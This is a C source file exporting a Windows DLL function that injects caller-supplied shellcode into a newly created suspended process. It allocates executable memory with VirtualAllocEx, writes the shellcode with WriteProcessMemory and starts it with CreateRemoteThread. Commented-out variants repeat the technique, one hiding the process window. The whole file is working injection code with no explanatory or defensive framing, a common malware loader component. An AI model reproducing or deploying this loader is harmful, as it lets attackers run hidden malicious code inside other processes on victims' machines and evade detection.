#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include "../include/injections.h"
//#include "../include/addresshunter.h"

DLLEXPORT VOID WINAPI injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize, LPCSTR lpApplicationName)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Create a new process (e.g., notepad.exe)
    if (!CreateProcessA(lpApplicationName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return;
    }

    // Step 2: Allocate memory in the remote process
    LPVOID remoteMemory = VirtualAllocEx(pi.hProcess, NULL, dwShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteMemory == NULL) {
        printf("VirtualAllocEx failed (%d).\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    // Step 3: Write shellcode to the allocated memory
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(pi.hProcess, remoteMemory, shellcode, dwShellcodeSize, &bytesWritten)) {
        printf("WriteProcessMemory failed (%d).\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    // Step 4: Create a remote thread to execute the shellcode
    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("CreateRemoteThread failed (%d).\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    // Step 5: Wait for the thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Step 6: Clean up
    VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
    TerminateProcess(pi.hProcess, 0);
    TerminateThread(pi.hThread, 0);
    //CloseHandle(hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return;

    /*
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Hide the window

    BOOL success = CreateProcessA
    (
        lpApplicationName,                      // lpApplicationName
        NULL,                                   // lpCommandLine
        NULL,                                   // lpProcessAttributes
        NULL,                                   // lpThreadAttributes
        TRUE,                                   // bInheritHandles
        CREATE_NO_WINDOW,                       // dwCreationFlags
        NULL,                                   // lpEnvironment
        NULL,                                   // lpCurrentDirectory
        &si,                                    // lpStartupInfo
        &pi                                     // lpProcessInformation
    );

    if (!success)
    {
        #ifdef DEBUG
        CHAR buf[256];
        FormatMessageA
        (
            FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
            NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
            buf, (sizeof(buf) / sizeof(CHAR)), NULL
        );
        MessageBoxA(0, buf, "Fail", 0x0L);
        #endif
        return;
    }

    HANDLE hInjectedShellcode = VirtualAllocEx(pi.hProcess, NULL, dwShellcodeSize, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (hInjectedShellcode == NULL)
    {
        #ifdef DEBUG
        MessageBoxA(0, "injectIntoProcess: Memory allocation failed", "Fail", 0x0L);
        #endif
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return;
    }

    SIZE_T bytesWritten;
    if (!WriteProcessMemory(pi.hProcess, hInjectedShellcode, shellcode, dwShellcodeSize, &bytesWritten))
    {
        #ifdef DEBUG
        MessageBoxA(0, "WriteProcessMemory: fail", "Fail", 0x0L);
        #endif
        VirtualFreeEx(pi.hProcess, hInjectedShellcode, 0, MEM_RELEASE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return;
    }

    // Flush the instruction cache to ensure the CPU sees the new shellcode
    if (!FlushInstructionCache(pi.hProcess, hInjectedShellcode, bytesWritten))
    {
        #ifdef DEBUG
        MessageBoxA(0, "FlushInstructionCache: fail", "Fail", 0x0L);
        #endif
        VirtualFreeEx(pi.hProcess, hInjectedShellcode, 0, MEM_RELEASE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return;
    }

    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)hInjectedShellcode, NULL, 0, NULL);

    if (hThread == NULL)
    {
        #ifdef DEBUG
        CHAR buf[256];
        FormatMessageA
        (
            FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
            NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
            buf, (sizeof(buf) / sizeof(CHAR)), NULL
        );
        MessageBoxA(0, "injectIntoProcess: Thread creation failed", "Fail", 0x0L);
        MessageBoxA(0, buf, "Fail", 0x0L);
        #endif
        VirtualFreeEx(pi.hProcess, hInjectedShellcode, 0, MEM_RELEASE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return;
    }

    DWORD ret = WaitForSingleObject(hThread, INFINITE);  // 10 seconds
    #ifdef DEBUG
    if ( ret == WAIT_ABANDONED )
    {
        MessageBoxA(0, "wait abandon", "Fail", 0x0L);
    }
    else if ( ret == WAIT_OBJECT_0 )
    {
        MessageBoxA(0, "wait object", "Fail", 0x0L);
    }
    else if ( ret == WAIT_TIMEOUT )
    {
        MessageBoxA(0, "wait timeout", "Fail", 0x0L);
    }
    else if ( ret == WAIT_FAILED )
    {
        MessageBoxA(0, "wait fail", "Fail", 0x0L);
    }
    #endif

    success = VirtualFreeEx(pi.hProcess, hInjectedShellcode, 0, MEM_RELEASE);
    if (!success)
    {
        #ifdef DEBUG
        CHAR buf[256];
        FormatMessageA
        (
            FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
            NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
            buf, (sizeof(buf) / sizeof(CHAR)), NULL
        );
        MessageBoxA(0, "VirtualFreeEx: fail", "Fail", 0x0L);
        MessageBoxA(0, buf, "Fail", 0x0L);
        #endif
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hThread);
    MessageBox(0, "Ok1", "w", 0x0L);
    return;
    */
}

/*
DLLEXPORT VOID WINAPI injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize, LPCSTR lpApplicationName)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessA(lpApplicationName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        #ifdef DEBUG
        printf("CreateProcess failed (%d).\n", GetLastError());
        #endif
        return;
    }

    LPVOID remoteMemory = VirtualAllocEx(pi.hProcess, NULL, dwShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteMemory == NULL) {
        #ifdef DEBUG
        printf("VirtualAllocEx failed (%d).\n", GetLastError());
        #endif
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    SIZE_T bytesWritten;
    if (!WriteProcessMemory(pi.hProcess, remoteMemory, shellcode, dwShellcodeSize, &bytesWritten)) {
        #ifdef DEBUG
        printf("WriteProcessMemory failed (%d).\n", GetLastError());
        #endif
        VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
    if (hThread == NULL) {
        #ifdef DEBUG
        printf("CreateRemoteThread failed (%d).\n", GetLastError());
        #endif
        VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
    TerminateProcess(pi.hProcess, 0);
    TerminateThread(pi.hThread, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return;
}
*/

